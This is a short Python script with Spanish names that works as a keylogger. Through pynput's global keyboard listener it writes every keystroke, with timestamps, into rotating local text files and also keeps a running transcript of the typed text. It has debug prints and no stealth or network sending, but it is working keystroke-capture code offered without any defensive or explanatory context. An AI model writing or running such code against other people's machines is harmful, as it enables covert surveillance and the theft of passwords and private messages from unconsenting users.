import datetime
from pynput.keyboard import Listener
from io import open

def obtenerfh():
    return datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

Fecha_hoy = obtenerfh()
Fecha_hoy2 = obtenerfh()
milista = []

cont_letras = 0
cont_lote = 1
global cont
cont = []

for i in range(200):
    cont.append(0)


def imprimir_linea(archivo, key, fecha, n):
    print("1")
    n = str(n)
    print("2")
    if key == "Key.space":
        key = " "
    elif key == "Key.alt_l":
        key = "ALT"

    elif key == "<97>":
        key = "1"
    elif key == "<98>":
        key = "2"
    elif key == "<99>":
        key = "3"
    elif key == "<100>":
        key = "4"
    elif key == "<101>":
        key = "5"
    elif key == "<102>":
        key = "6"
    elif key == "<103>":
        key = "7"
    elif key == "<104>":
        key = "8"
    elif key == "<105>":
        key = "9"

    print("3")
    archivo.write("Caracter " + key + " fecha y hora " + fecha + " ----->total "+n+"\n")
    print("4")


def escribir(letra, archivo):
    if letra == "Key.enter":
        archivo.write("\n")
    elif letra == "Key.space":
        archivo.write(" ")
    elif letra == "Key.alt_l":
        archivo.write("ALT")
    elif letra == "Key.backspace":
        archivo.write("%BORRAR%")
    else:
        archivo.write(letra.replace("'", ""))

def corregir(teclado):
    if len(teclado) == 3:
        res = teclado[1]
    else:
        res = teclado.replace("'", "")
    return res


def contar(letra):
    letra = corregir(letra)
    num = ord(letra)
    cont[num] += 1

def mostrar():
    print(cont[97])


def Recibirtecla(key):
    global Fecha_hoy
    global cont_letras
    global cont_lote
    global fichero
    fichero = open(f"informacion_" + Fecha_hoy + ".txt", "a")
    fichero2 = open(f"informacion_total_" + Fecha_hoy2 + ".txt", "a")
    fecha_instante = obtenerfh()
    key = str(key)
    # contar(key)
    cont_letras += 1
    imprimir_linea(fichero, key, fecha_instante, cont_letras)
    escribir(key, fichero2)
    # milista.append(key)

    if cont_letras == 20:
        cont_lote += 1

        fichero.close()
        fecha = obtenerfh()

        fichero = open(f"informacion_{fecha}.txt", "a")
        Fecha_hoy = fecha
        cont_letras = 0


with Listener(on_press=Recibirtecla) as l:
    l.join()

"""
    for i in milista:
        if cont_letra == 20:
            fichero.close()
            # fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
            fecha = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            fichero = open(f"informacion_{fecha}.txt", "w")
            cont_letra = 0

        if i == "Key.enter":
            fichero.write("\n")
            cont_enter = cont_enter + 1
        elif i == "Key.space":
            fichero.write(" ")
            cont_space = cont_space + 1
        elif i == "Key.alt_l":
            fichero.write("ALT")
            cont_alt = cont_alt + 1
        elif i == "Key.backspace":
            fichero.write("%BORRAR%")
            cont_back = cont_back + 1
        else:
            fichero.write(i.replace("'", ""))
            cont_letra = cont_letra + 1

        # fichero.write("\nCantidad de letras %d"%cont_letra)

"""
